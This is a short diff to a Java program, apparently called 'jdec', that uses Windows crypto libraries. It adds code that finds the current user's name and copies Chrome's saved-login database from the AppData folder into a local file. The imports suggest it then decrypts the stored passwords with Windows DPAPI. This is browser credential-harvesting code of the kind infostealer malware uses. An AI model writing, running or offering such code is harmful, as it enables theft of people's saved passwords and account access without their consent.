@@ -1,6 +1,8 @@
 import java.util.*;
 import java.lang.Object;
 
+import org.apache.commons.io.FileUtils;
+
 import com.sun.jna.*;
 import com.sun.jna.platform.win32.*;
 import com.sun.jna.platform.win32.WinCrypt.DATA_BLOB;
@@ -22,7 +24,17 @@ import java.sql.Statement;
 
 public class jdec extends Crypt32Util {
 	
-	public static void main(String[] args) throws SQLException, FileNotFoundException, UnsupportedEncodingException{
+	public static void main(String[] args) throws SQLException, IOException {
+		
+		// Get username, should work for all OS
+		String user = System.getProperty("user.name");
+		
+		// Get password files
+		
+		// Chrome
+		File chrome = FileUtils.getFile("C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
+		File chromedest = FileUtils.getFile("logindata.db");
+		FileUtils.copyFile(chrome, chromedest);
 		
 		// Redirect output to text file
 		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
